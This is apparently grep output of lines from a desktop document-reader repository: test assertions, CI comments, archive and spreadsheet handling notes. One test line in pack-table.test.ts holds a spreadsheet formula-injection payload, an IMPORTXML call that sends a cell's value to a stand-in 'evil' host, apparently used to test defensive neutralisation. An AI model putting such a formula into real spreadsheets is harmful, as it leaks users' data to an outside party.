+C:/Dev/reader/worktrees/residue\apps\desktop\src\export\model.ts:172:  return `# A brief\n\n${pieces === 1 ? 'One part' : `${pieces} parts`}, each quoted exactly from its file, with the file and its lines after it. Read the files themselves before changing them.\n\n${markdown}`;
+C:/Dev/reader/worktrees/residue\apps\desktop\src\export\model.test.ts:97:  const md = notesMarkdown('/r/a.xlsx', ['PK'], [{ l0: 0, text: 'Odd total', address: '#Summary!F5' }]);
+C:/Dev/reader/worktrees/residue\apps\desktop\src\export\model.test.ts:98:  assert.equal(md, '# Notes on /r/a.xlsx\n\n## `/r/a.xlsx#Summary!F5`\n\nOdd total\n');
+C:/Dev/reader/worktrees/residue\apps\desktop\src\startup\measure.ts:3:// scripts/measure-startup.mjs and the nightly read them by name.
+C:/Dev/reader/worktrees/residue\apps\desktop\src\startup\measure.ts:7:/** Module evaluation time: the `script_start` mark reports it. */
+C:/Dev/reader/worktrees/residue\apps\desktop\src\startup\measure.ts:72: * the check instead of passing quietly. The count runs from module evaluation; a later launch in the
+C:/Dev/reader/worktrees/residue\apps\desktop\src\startup\measure.ts:148:      // Two fields exactly: the acceptance criterion names this line, and the startup harness parses it.
+C:/Dev/reader/worktrees/residue\apps\desktop\scripts\tauri-check.mjs:465:  // without the file being read whole (A3, for E9). The frames are encoded here in the page, VP9 by WebCodecs.
+C:/Dev/reader/worktrees/residue\apps\desktop\scripts\tauri-check.mjs:1648:  // F11 and Esc, read from the window itself (is_fullscreen). The window is put back whatever happens.
+C:/Dev/reader/worktrees/residue\apps\desktop\scripts\smoke-verdict.test.mjs:1:// Named checks for the frameless skip, CI requiredness, afterPaint neutralization,
+C:/Dev/reader/worktrees/residue\apps\desktop\scripts\smoke-verdict.test.mjs:112:    // pnpm test in CI runs before the binary exists; the harness self-check below still runs.
+C:/Dev/reader/worktrees/residue\apps\desktop\scripts\smoke-verdict.mjs:4:// In CI the smoke is required: the `CLI smoke check on the built binary` step runs `verify:cli`
+C:/Dev/reader/worktrees/residue\apps\desktop\scripts\smoke-verdict.mjs:5:// (`MARXY_SMOKE_REQUIRED=1`) in ci.yml's `rust` job and in nightly.yml's macOS and Linux builds.
+C:/Dev/reader/worktrees/residue\apps\desktop\scripts\smoke-verdict.mjs:19: * `MARXY_SMOKE_REQUIRED=1` is required mode: `verify:cli` sets it, and so does CI's
+C:/Dev/reader/worktrees/residue\apps\desktop\scripts\smoke-verdict.mjs:93: * never `ok`: skipped where the smoke is optional, a failure where it is required (a CI runner that cannot
+C:/Dev/reader/worktrees/residue\apps\desktop\scripts\smoke-verdict.mjs:118: * that runner then logs `fuse init failed` and starts from a dirtier machine (CI run 37040073668).
+C:/Dev/reader/worktrees/residue\apps\desktop\test\source-mode-shell.test.mjs:135:    // round trip then "moves" by the reflow, not by the mode switch (seen once on Linux CI: 3375 →
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\commands\os.rs:2://! Open in external editor (D-A31).
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\commands\os.rs:200:/// `std::process::Command` and never to a shell (D-A31). A template is split on ASCII whitespace
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\commands\os.rs:543:/// Hands a file the page opened to the system (B5's file card): `reveal` false opens it in the program the system uses
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\commands\media.rs:2://! waveform, for the media page (E9; `src/facts/media.rs`). Like `image_facts` they read only what the page opened.
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\commands\held.rs:1://! An archive's entry read by a reader that needs it whole (archive page A6): a database, a workbook, a font or a
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\commands\font.rs:1://! `font_facts` and `font_glyph`: what a font file is and what one of its glyphs is, for the font page (E7; `src/font`).
+C:/Dev/reader/worktrees/residue\packages\core\src\parse\reparse.test.ts:5:// The structured property runs a fixed number of seeds on every CI run. A stress run takes more:
+C:/Dev/reader/worktrees/residue\apps\desktop\scripts\smoke-cli-open.mjs:2:// and checks the acceptance criteria that need a real window: the document renders, `MARK first_text
+C:/Dev/reader/worktrees/residue\apps\desktop\scripts\smoke-cli-open.mjs:7:// MARXY_SMOKE_REQUIRED=1 (verify:cli, which CI runs as `CLI smoke check on the built binary`)
+C:/Dev/reader/worktrees/residue\apps\desktop\scripts\smoke-cli-open.mjs:62:  process.env.MARXY_BIN, // CI builds with `--profile ci` and names the binary
+C:/Dev/reader/worktrees/residue\apps\desktop\scripts\smoke-cli-open.mjs:77:// WebKitGTK needs a display; CI runners have xvfb and no DISPLAY. On a virtual display it also needs
+C:/Dev/reader/worktrees/residue\apps\desktop\scripts\smoke-cli-open.mjs:88:// Long enough for the 30 s WebKitGTK-under-Xvfb warm-up on a CI runner, which happens before the app
+C:/Dev/reader/worktrees/residue\apps\desktop\scripts\smoke-cli-open.mjs:298:// instead of pretending either way: strict where the answer is required (CI verify:cli, MARXY_SMOKE_REQUIRED=1),
+C:/Dev/reader/worktrees/residue\apps\desktop\scripts\sign-windows.mjs:120:  // Only the credentials a desktop or CI run uses; the rest each cost a probe (managed identity
+C:/Dev/reader/worktrees/residue\apps\desktop\scripts\pdf-fixture.mjs:89:/** The demo's essay as three A5 pages, its title and byline on the first, an outline of its three parts. */
+C:/Dev/reader/worktrees/residue\apps\desktop\scripts\pdf-fixture.mjs:108:/** A long PDF: `n` A4 pages, each naming its number, the word `needle` on the last. */
+C:/Dev/reader/worktrees/residue\apps\desktop\src\left\panels\export.ts:3:// JSON Lines for a table; one page, one Markdown file or a bundle of the ticked files; the tray as Markdown or a brief),
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\stray-bytes.ts:91: * pasted before a stray `\udcff` encodes as F0 90 83 BF, not FF (the review of #584).
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\stray-bytes.ts:217:    // The byte in a thin box, so `E9` the byte never reads as the letters E and 9.
+C:/Dev/reader/worktrees/residue\apps\desktop\test\depths.test.mjs:3:// the rest back. Ports the prototype's checks 11a, 11b, 12, 14a, 14b and 15 (lab 25 test/check.mjs) by name, and adds
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\colour.ts:60:/** The lines on screen, then the editor's viewport around them (D3: read first, in that order), 0-based. */
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\colour.test.mjs:1:// D1: how Source lays the worker's runs: each piece replaces the marks over its span and no others, the marks follow an
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\fence-lang.ts:1:// Each fenced block in Markdown's Source carries its own language scope (D4 for Source): the lines between its fence
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\fence-lang.test.ts:1:// D4 for Source: a fence's lines carry the registry's id for its word, and a braced fence (Quarto's ```{r}) the id
+C:/Dev/reader/worktrees/residue\apps\desktop\test\kinds-media2.test.mjs:4:// refuse. Ports the prototype's K-media checks where they apply (lab 25, test/kinds-media.mjs).
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\stray-bytes.test.mjs:303:// in it fused with a stray byte already in the text (a valid pair) and rewrote FF as F0 90 83 BF.
+C:/Dev/reader/worktrees/residue\apps\desktop\test\kinds-docs.test.mjs:37:  '/r/notes/2026-10-08.md': '2026-10-08\n\n# Thursday\n\n- one\n\nOn 2026-10-09 we met.\n',
+C:/Dev/reader/worktrees/residue\apps\desktop\src\view\rendered-view.ts:841:  // Colour anyway, or plain text again (D3's tier): the page is set again where the reader is.
+C:/Dev/reader/worktrees/residue\apps\desktop\src\shell\tauri.ts:319:  /** What each file's head says it is (B2, src/detect.rs); null for a path that is not a readable regular file. */
+C:/Dev/reader/worktrees/residue\apps\desktop\src\shell\tauri.ts:755:  /** Rust reads `external_editor` and runs it without a shell; only the path and line cross (D-A31). */
+C:/Dev/reader/worktrees/residue\apps\desktop\test\kinds-cursor.test.mjs:5:// is only read. Ports the prototype's K-frame, K-trees and K-pack checks where they apply (lab 25, test/kinds-*.mjs).
+C:/Dev/reader/worktrees/residue\packages\core\src\parse\parse.test.ts:371:// test used to carry is gone). The nightly perf harness now records parse in the app as
+C:/Dev/reader/worktrees/residue\packages\core\src\sanitize\budget.test.ts:7:// every gate stayed green. The nightly start-up record times the packaged app, not this function.
+C:/Dev/reader/worktrees/residue\packages\core\src\sanitize\budget.test.ts:11:// number being larger than another, and a shared CI runner produces that on its own. The ratio
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\source-browser.test.mjs:207:// Since D1 Source's colour is the Shiki grammar the highlight worker loads, so the Go grammar's chunk is the one build
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\source-browser.test.mjs:264:// D1: Source is coloured from Read's tokenizer. Each file is drawn in Source, and its text drawn as a Read fence in the
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\source-browser.test.mjs:335:    // Recorded, not a CI failure. What does fail is a measurement that did not happen.
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\role-parity.test.mjs:51:// and Shiki before D1; the gap closed because both modes read Shiki.
+C:/Dev/reader/worktrees/residue\apps\desktop\test\save-trust.test.mjs:101:// ---- B9: an edit made while a save is in flight ------------------------------------------------
+C:/Dev/reader/worktrees/residue\apps\desktop\test\save-trust.test.mjs:129:// ---- B10: save failure wording, and saving a file that was deleted ------------------------------
+C:/Dev/reader/worktrees/residue\apps\desktop\test\save-trust.test.mjs:189:// ---- B11: "Show source" lands on the byte, not the UTF-16 index --------------------------------
+C:/Dev/reader/worktrees/residue\apps\desktop\test\save-trust.test.mjs:209:// ---- B13 / B14 / B15: trust grants -------------------------------------------------------------
+C:/Dev/reader/worktrees/residue\apps\desktop\test\save-trust.test.mjs:308:// ---- B14 / B15 without a browser ---------------------------------------------------------------
+C:/Dev/reader/worktrees/residue\packages\core\src\render\typography.ts:1:// Smart typography as a render-time text-run transform. The file's bytes are never touched (D-A13).
+C:/Dev/reader/worktrees/residue\packages\core\src\render\typography.ts:41: * Applies the D-A13 rule table to one text run. Idempotent: a second pass returns the same string.
+C:/Dev/reader/worktrees/residue\packages\core\src\render\typography.ts:135: * (`code`, `kbd`, `samp`, `pre`) opened earlier in the same sibling list (handbook P06).
+C:/Dev/reader/worktrees/residue\packages\core\src\render\typography.test.ts:1:// The D-A13 rule table, idempotence, and the acceptance criterion: 09-gfm-everything.md is set with
+C:/Dev/reader/worktrees/residue\packages\core\src\render\typography.test.ts:162:  // The criterion is a render pass. If this file were rewritten, the fidelity gate would be
+C:/Dev/reader/worktrees/residue\apps\desktop\src\document\entries.ts:14:  /** The archive's own path: on disk, or the `archive-entry:` path of the entry it was read from (archive page A7). */
+C:/Dev/reader/worktrees/residue\apps\desktop\src\document\entries.ts:23:   * archive's entry is read by the shell's readers from where it lies (archive page A6).
+C:/Dev/reader/worktrees/residue\apps\desktop\src\document\entries.ts:28:  /** 1 for an entry of an archive on disk, 2 for an entry of that entry, and so on (archive page A7). */
+C:/Dev/reader/worktrees/residue\apps\desktop\src\document\entries.ts:104:// Entries held for an archive page's preview (archive page A3): a pool of their own, so following the cursor through an
+C:/Dev/reader/worktrees/residue\apps\desktop\src\document\entries.ts:150:// Entries held for an archive's sheet (archive page A5): a pool of their own, apart from the tabs' and the previews', so
+C:/Dev/reader/worktrees/residue\apps\desktop\src\document\entries.ts:202: * (archive page A7). Null for any other path, an attachment and a cell included.
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\editor.ts:24:  /** Legacy app passes `false` to mean handbook default; only `true` forces on. */
+C:/Dev/reader/worktrees/residue\packages\core\src\render\render-html.ts:292:/** Last prose text run that may receive paragraph-end smartening (D-A13 widont). */
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\editor-cm6.ts:59:  // Colour anyway, or back to plain text (D3's tier, the Reading card): the language is laid again from nothing.
+C:/Dev/reader/worktrees/residue\apps\desktop\test\round3-desktop.test.mjs:24:/** The app's Mod key as the page itself sees the platform (Control on Linux CI). */
+C:/Dev/reader/worktrees/residue\apps\desktop\src\shell\memory.ts:226: * What the Rust shell's reader says of an archive's entry (archive page A6): the same file, read from memory as a copy
+C:/Dev/reader/worktrees/residue\apps\desktop\src\shell\memory.ts:343:   * The bytes a reader reads: the file's, or (archive page A6) entry `inArchive` of the archive at `path`, read by the twin
+C:/Dev/reader/worktrees/residue\apps\desktop\src\shell\memory-archive-heads.test.ts:1:// `readArchiveHeads` on the memory shell (archive page A1): the twin's heads over the page's own inflate, which stops at
+C:/Dev/reader/worktrees/residue\packages\core\src\render\link-host.ts:1:// Link text vs destination host comparison and mismatch labels (handbook ch.7).
+C:/Dev/reader/worktrees/residue\packages\core\src\render\link-host.test.ts:1:// Host mismatch labels on links (handbook ch.7).
+C:/Dev/reader/worktrees/residue\packages\core\src\render\lang-attr.test.ts:1:// D4: a code block's `<pre>` carries `data-marxy-lang`, the registry's id, so a theme's language scope meets a fence
+C:/Dev/reader/worktrees/residue\packages\core\src\render\invisibles.ts:1:// Display-only markers for invisible and bidirectional characters (handbook ch.7).
+C:/Dev/reader/worktrees/residue\packages\core\src\render\invisibles.ts:72:/** Whether a code point is flagged by the handbook rule table. */
+C:/Dev/reader/worktrees/residue\packages\core\src\render\invisibles.test.ts:1:// Rule table for invisible-character markers (handbook ch.7).
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\archive\zip.rs:1153:    /// Acceptance A1: a read by offset lands on a local header and checks it names the entry listed there.
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\archive\zip.rs:1193:    /// Acceptance A1: a head of an encrypted entry is the refusal, never its bytes.
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\highlight-style.ts:2:// links, inline code). Since D1 a code file's tokens and a fence's are coloured from Shiki's runs (colour.ts), as Read
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\highlight-style.ts:59:/** Names being defined take weight as well as colour (the handbook's rule). JetBrains Mono keeps its advance at every weight. */
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\archive\rar.rs:485:    /// A RAR 4 file block: `(name, data, flags)`, its date 2023-11-14 22:13:20.
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\archive\mod.rs:1://! Archives: list one and read one entry into memory (E3; `src/commands/archive.rs`). Nothing here writes to disk or
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\archive\mod.rs:1141:    // ---- the shared table, heads and the index (archive page A1) ---------------------------------------------------
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\archive\mod.rs:1274:    /// Acceptance A1: the heads of ten entries of a tar.gz come from one walk of its stream, counted.
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\archive\mod.rs:1351:    /// Acceptance A1: heads stop at the budget in all; the wants past it are left out, not refused.
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\archive\iso.rs:397:        // 2023-11-14 22:13:20 UTC, written as 23:13:20 at UTC+1.
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\src\archive\cab.rs:428:            // 2023-11-14, 22:13:20
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\mode-switch.test.mjs:133:  // "a", then E2 82 (a cut-off three-byte sequence), then "b\r\n", then FF, then "c\r\n" with a BOM: CRLF, BOM and strays at once.
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\line-numbers.ts:27: * `explicit === false` from the legacy app shell means “use handbook default”, not “force off”.
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\language.ts:29: * anyway (D3's plain-text tier, `render/colour-tier.ts`).
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\harness-entry.ts:251: * Two stray bytes made neighbours by deleting the line break between them (C3, A9: they spell é), then Q typed at the
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\harness-entry.ts:340: * D1: Source's colour for `path`, as drawn: each character of the editor's lines and its role, read from the DOM once the
+C:/Dev/reader/worktrees/residue\apps\desktop\src\source\harness-entry.ts:375: * D1: Read's colour for `text` in `lang`, as Read draws a fence: a `<pre><code class="language-…">` coloured by the same
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\Cargo.toml:26:# Magic bytes for content detection (B2, src/detect.rs). MIT; already in Cargo.lock through tauri-utils.
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\Cargo.toml:28:# Decoders for the formats the webview cannot show (C2, src/decode): TIFF, TGA, OpenEXR, Radiance HDR, QOI, PNM, farbfeld
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\Cargo.toml:37:# Archive listing and one-entry reads (E3, src/archive): deflate for zip, gzip for tar.gz and lone .gz. MIT OR Apache-2.0;
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\Cargo.toml:57:# SQLite databases read in place, read-only (E5, src/tables): SQLite itself compiled in, `serialize` for a copy held
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\Cargo.toml:60:# Spreadsheets as saved (E6, src/tables): xlsx, xlsm, xls (BIFF in a compound file) and ods; cached values, formulas as
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\Cargo.toml:74:# Text that is not UTF-8 (B3, src/encoding): encoding_rs decodes and encodes the WHATWG encodings, chardetng guesses one
+C:/Dev/reader/worktrees/residue\apps\desktop\src-tauri\Cargo.toml:111:# CI builds: thin LTO and more codegen units so a CI build pays seconds, not minutes, for the
+C:/Dev/reader/worktrees/residue\apps\desktop\test\images.test.mjs:417:// C3: a local SVG shows through <img>, sized from its root, and its script never runs.
+C:/Dev/reader/worktrees/residue\packages\core\src\render\frontmatter.ts:10:/** Display rows before the overflow line; matches the handbook default (not contract). */
+C:/Dev/reader/worktrees/residue\packages\core\src\render\frontmatter.ts:165:/** `2026-09-14` as `14 September 2026`; null for anything that is not a calendar day of year 1 or later written so. */
+C:/Dev/reader/worktrees/residue\packages\core\src\render\frontmatter.test.ts:156:  const html = head('---\ntitle: a\nsource: https://example.org/x\npublished: 2026-10-01\ndescription: d\n---\n');
+C:/Dev/reader/worktrees/residue\apps\desktop\src\document\open.ts:519:      // (B5: a 2 GB file opens at once), and open as a page of the app's own. A certificate is PEM text or DER bytes: its head says which.
+C:/Dev/reader/worktrees/residue\apps\desktop\test\full-screen.test.mjs:1:// Full screen over the memory shell: F11 takes the window full screen with the page alone, the chrome wakes on intent and
+C:/Dev/reader/worktrees/residue\apps\desktop\test\full-screen.test.mjs:2:// goes again, the Line still opens, and Esc and F11 bring the frame back. Playwright WebKit.
+C:/Dev/reader/worktrees/residue\apps\desktop\test\post-passes.test.mjs:13: * A job without Playwright's WebKit (CI's `fast` job) skips these tests and says why, unless
+C:/Dev/reader/worktrees/residue\packages\core\src\render\boundary.test.ts:68:  // cannot reach outside its own directory passes vacuously — the round-1 finding, in a new shape.
+C:/Dev/reader/worktrees/residue\packages\core\src\render\boundary.test.ts:91:  // anything is the round-1 vacuity finding one level up, so the assertions are named here too.
+C:/Dev/reader/worktrees/residue\apps\desktop\src\tray\markdown.ts:13:  /** A part of a kind that is not lines (a cell, a page, a glyph): its address as written after the path, `#Summary!F5`. */
+C:/Dev/reader/worktrees/residue\apps\desktop\src\tray\markdown.ts:29: * address as written (`#Summary!F5`, `:3#height_m`).
+C:/Dev/reader/worktrees/residue\packages\core\src\render\alerts.ts:1:// GitHub alert blockquotes: a run-in type word, marker hidden, no box or colour (handbook ch.6).
+C:/Dev/reader/worktrees/residue\apps\desktop\src\render\math.ts:12: * so the line box stays a whole number of grid units; the grid is handbook ch.4 (04-spacing-layout).
+C:/Dev/reader/worktrees/residue\apps\desktop\src\render\embed-page.ts:1:// A text entry's page inside another page (archive page A3, `viewers/embed.ts`): what the pane draws for those bytes, by
+C:/Dev/reader/worktrees/residue\apps\desktop\test\frontispiece-boot.test.mjs:16: * A job without Playwright's WebKit (CI's `fast` job) skips the browser cases and says why, unless
+C:/Dev/reader/worktrees/residue\apps\desktop\test\look.test.mjs:4:// prototype's checks 36a, 36b, 37 and P-look 01 and 03 (lab 25 test/check.mjs, test/kinds-palettes.mjs).
+C:/Dev/reader/worktrees/residue\apps\desktop\test\phase-e-flow.test.mjs:1:// The screen criterion, end to end. An assistant's answer sits on the pasteboard, wrapped in one
+C:/Dev/reader/worktrees/residue\apps\desktop\test\phase-e-flow.test.mjs:33: * The four changes the criterion makes, found in `doc` (ASCII, so a UTF-16 offset is a byte offset), and the
+C:/Dev/reader/worktrees/residue\apps\desktop\test\phase-e-flow.test.mjs:102: * The criterion, once, on `doc` (the fixture with the file's line endings). `neutralise` serves the slice fold
+C:/Dev/reader/worktrees/residue\apps\desktop\src\versions\recorder.test.ts:3:// 2026-11-02: the data folder is not a record of what was read), and never for a keystroke, an undo or a fold of Source.
+C:/Dev/reader/worktrees/residue\packages\core\src\page\clean.ts:1:// An HTML page cleaned to be drawn in a sandbox (E8 mail's HTML part, E10 an HTML file read as a page). It
+C:/Dev/reader/worktrees/residue\packages\core\src\outline\outline.test.ts:53:// Shallow CI checkouts often have no origin/main; throwing on the three-dot
+C:/Dev/reader/worktrees/residue\apps\desktop\src\selection\bind.ts:179: * Shift+F10, or Enter with something selected open it under the selection.
+C:/Dev/reader/worktrees/residue\apps\desktop\src\versions\recorder.ts:3:// (`before reload`: what was on disk). Never when a file is opened (Ian, 2026-11-02: the data folder is not a record of what
+C:/Dev/reader/worktrees/residue\apps\desktop\test\left-doc.test.mjs:5:// checks (lab 25 test/left-doc.mjs) by name where they apply to the app. Playwright WebKit.
+C:/Dev/reader/worktrees/residue\apps\desktop\test\layout-shift-window.test.mjs:23:/** Main-branch gate literals; criterion 4 forbids moving them. */
+C:/Dev/reader/worktrees/residue\apps\desktop\test\link-beside.test.mjs:34:// The width follows the theme's metrics (split-screen-criterion proves the number by splitting at it).
+C:/Dev/reader/worktrees/residue\apps\desktop\src\theme\reader-config.ts:126: * handbook's 1.5 to 1.6 for code (06-code.md, "Line length, tabs and line height"). A whole pixel keeps every
+C:/Dev/reader/worktrees/residue\apps\desktop\src\theme\offset.ts:9: * desktop. It is to be measured when one exists (Linux parity is a release criterion,
+C:/Dev/reader/worktrees/residue\apps\desktop\test\log.test.mjs:924:    // (`longest main-thread block`, printed above) is a record for the nightly run to read, never a bound.
+C:/Dev/reader/worktrees/residue\apps\desktop\test\kinds-tables.test.mjs:2:// address (`#stations/2/lat`, `#Summary!F5`), `c` the stored value, `x` the record or the cell as stored, `o` a BLOB in a
+C:/Dev/reader/worktrees/residue\apps\desktop\test\kinds-tables.test.mjs:4:// change verbs refusing. Ports the prototype's K-tables checks where they apply (lab 25, test/kinds-tables.mjs).
+C:/Dev/reader/worktrees/residue\apps\desktop\test\kinds-tables.test.mjs:254:    assert.equal(b.where, 'tide-log-2026.xlsx#Summary!F5', 'a cell by its sheet and reference');
+C:/Dev/reader/worktrees/residue\apps\desktop\test\kinds-tables.test.mjs:263:    assert.equal(await clipboard(page), `> 0.03456221198156682\n\n— \`${XLSX}#Summary!F5\`\n`);
+C:/Dev/reader/worktrees/residue\apps\desktop\test\kinds-tables.test.mjs:264:    // A merged title is one cell: row 1 holds A1, then G1.
+C:/Dev/reader/worktrees/residue\apps\desktop\test\kinds-tables.test.mjs:266:    assert.equal(await where(page), 'tide-log-2026.xlsx#Summary!A1');
+C:/Dev/reader/worktrees/residue\apps\desktop\test\kinds-tables.test.mjs:300:    assert.equal(await where(page), 'tide-log-2026.xlsx#Readings!C2');
+C:/Dev/reader/worktrees/residue\apps\desktop\test\kinds-tables.test.mjs:328:    assert.equal(await where(page), 'tide-log-2026.ods#Summary!F5');
+C:/Dev/reader/worktrees/residue\apps\desktop\test\lang-scope.test.mjs:1:// D4: every code block in Read and the Source editor carry `data-marxy-lang`, the registry's id, so a theme's
+C:/Dev/reader/worktrees/residue\apps\desktop\src\selection\verb-menu.ts:2:// on a Mac), the context-menu key, Shift+F10, or Enter on a selection (the openers are in `bind.ts`); it
+C:/Dev/reader/worktrees/residue\apps\desktop\test\kinds-pack-media.test.mjs:5:// prototype's K-pack 10 to 12 and 16 and K-media 02, 03 and 07 where they apply (lab 25, test/kinds-pack.mjs and
+C:/Dev/reader/worktrees/residue\apps\desktop\test\left-frame.test.mjs:4:// L-frame checks (lab 25 test/left-frame.mjs) by name where they apply to the app.
+C:/Dev/reader/worktrees/residue\apps\desktop\test\operations-edit.test.mjs:395:  ['a loose task list', '/loose-tasks.md', '# Plan\n\n- [ ] Write the brief\n\n- [x] Book the room\n', 'Write the brief'],
+C:/Dev/reader/worktrees/residue\apps\desktop\test\palette-input-guards.test.mjs:19:// The app's Mod is Cmd on macOS and Ctrl elsewhere; CI runs these on Linux too.
+C:/Dev/reader/worktrees/residue\apps\desktop\test\live-reload.test.mjs:15:// CI lost 15-minute jobs to a test of this file that never returned. `page.evaluate` has no timeout of
+C:/Dev/reader/worktrees/residue\apps\desktop\test\live-reload.test.mjs:80:  // on Linux CI about one run in twenty stalled here with no error: the page's load or the evaluate
+C:/Dev/reader/worktrees/residue\apps\desktop\test\live-reload.test.mjs:841:// 2026-09-26 review.
+C:/Dev/reader/worktrees/residue\packages\core\src\operations\front-matter-value.test.ts:138:  const shown = read('+++\ntitle = "Old" # note\nname = \'lit\'\ncount = 3\ndraft = true\nwhen = 2026-10-13\n+++\nBody\n');
+C:/Dev/reader/worktrees/residue\packages\core\src\operations\move-section.test.ts:68:  row('up: a section takes its sub-sections with it', '# A\na\n## A1\nx\n# B\nb\n## B1\ny\n', '# B\nb\n## B1\ny\n# A\na\n## A1\nx\n', 2),
+C:/Dev/reader/worktrees/residue\packages\core\src\operations\move-section.test.ts:70:  row('up: a deeper section in between goes with the one before it', '## A\na\n### A1\nx\n## B\nb\n', '## B\nb\n## A\na\n### A1\nx\n', 2),
+C:/Dev/reader/worktrees/residue\packages\core\src\operations\move-section.test.ts:81:  row('down: a section with sub-sections swaps with the next sibling and its sub-sections', '# A\na\n## A1\nx\n# B\nb\n## B1\ny\n', '# B\nb\n## B1\ny\n# A\na\n## A1\nx\n', 0),
+C:/Dev/reader/worktrees/residue\packages\core\src\operations\move-section.test.ts:95:    row('up: a swap of paragraph sections', '# A\n\nfirst.\n\n## A1\n\nx\n\n# B\n\nsecond.\n\n', '# B\n\nsecond.\n\n# A\n\nfirst.\n\n## A1\n\nx\n\n', 2),
+C:/Dev/reader/worktrees/residue\packages\core\src\operations\move-section.test.ts:138:    '# A\na\n## A1\nx\n# B\nb\n',
+C:/Dev/reader/worktrees/residue\apps\desktop\test\palette.test.mjs:428:    // Recorded, not a CI failure: the 16 ms product budget is printed beside the number.
+C:/Dev/reader/worktrees/residue\packages\core\src\operations\pack-table.test.ts:101:  const f = '=IMPORTXML("https://evil/?q="&A2,"//a")';
+C:/Dev/reader/worktrees/residue\packages\core\src\operations\operations.test.ts:475:// 2026-09-26 review: cases the corpus has none of.
+C:/Dev/reader/worktrees/residue\packages\core\src\operations\release-notes.test.ts:16:  const text = '# Changelog\n\nIntro.\n\n## [1.4.0] - 2026-09-12\n\n### Added\n\n- a\n\n## [1.3.0] - 2026-08-01\n\n- b\n';
+C:/Dev/reader/worktrees/residue\packages\core\src\operations\release-notes.test.ts:17:  assert.deepEqual(releaseOf(text), { label: '1.4.0', text: '## [1.4.0] - 2026-09-12\n\n### Added\n\n- a\n\n' });
+C:/Dev/reader/worktrees/residue\packages\core\src\operations\release-notes.test.ts:21:  const text = '# Changelog\n\n## Unreleased\n\n- soon\n\n## v2.0.1 — 2026-01-02\n\n- x\n';
+C:/Dev/reader/worktrees/residue\packages\core\src\operations\release-notes.test.ts:22:  assert.deepEqual(releaseOf(text), { label: 'v2.0.1', text: '## v2.0.1 — 2026-01-02\n\n- x\n' });
+C:/Dev/reader/worktrees/residue\packages\core\src\operations\release-notes.test.ts:37:  assert.equal(label('## [1.4.0](https://example.invalid/x) - 2026-09-12\n'), '1.4.0');
+C:/Dev/reader/worktrees/residue\packages\core\src\log\head.test.ts:24:  ['WindowsUpdate.log, Windows 7 to 8.1', '2015-10-07\t09:25:05:497\t 920\tb3c\tAU\t###########  AU: Initializing Automatic Updates  ###########', { time: '2015-10-07\t09:25:05:497', level: null, rank: 1 }],
+C:/Dev/reader/worktrees/residue\packages\core\src\log\head.test.ts:27:  ['IIS W3C', '2024-01-15 10:23:45 10.0.0.5 GET /default.htm - 443 - 192.168.1.20 Mozilla/5.0+(Windows+NT+10.0) https://example.com/ 404 0 2 15', { time: '2024-01-15 10:23:45', level: '404', rank: 2 }],
+C:/Dev/reader/worktrees/residue\packages\core\src\index-model\kinds.ts:1:// The index's file classes; the table itself is the registry (`kind/registry.ts`, B1).
+C:/Dev/reader/worktrees/residue\packages\core\src\kind\registry.ts:23: * what is not a text buffer (`apps/desktop/src/viewers`): the file card with the bytes beside it (B5, the floor for any
+C:/Dev/reader/worktrees/residue\packages\core\src\kind\registry.ts:93:/** Grammar id and the extensions it colours, for the languages D2 brought in (each grammar on the Shiki allow-list). */
+C:/Dev/reader/worktrees/residue\packages\core\src\kind\registry.ts:334: * The row `path` resolves to: what content detection recorded for it (`noteContent`, B2) when its head corrected the name;
+C:/Dev/reader/worktrees/residue\packages\core\src\kind\registry.ts:479:  // Emacs and Vim mode names (B2's modelines).
+C:/Dev/reader/worktrees/residue\packages\core\src\kind\content.test.ts:1:// B2: content corrects the name. fixtures/detect/expected.json is shared with src-tauri/src/detect.rs, whose test checks
+C:/Dev/reader/worktrees/residue\packages\core\src\kind\registry.test.ts:120:// B1: one registry, every surface. Each row's sample paths resolve to the row, and open (detectFileKind), the index
+C:/Dev/reader/worktrees/residue\packages\core\src\kind\registry.test.ts:132:    // MATLAB and Prolog have no name of their own: only content reaches them (B2, content.test.ts).
+C:/Dev/reader/worktrees/residue\packages\core\src\kind\registry.test.ts:197:  // The extensions D2 is done by, and those of the languages no mode coloured before it.
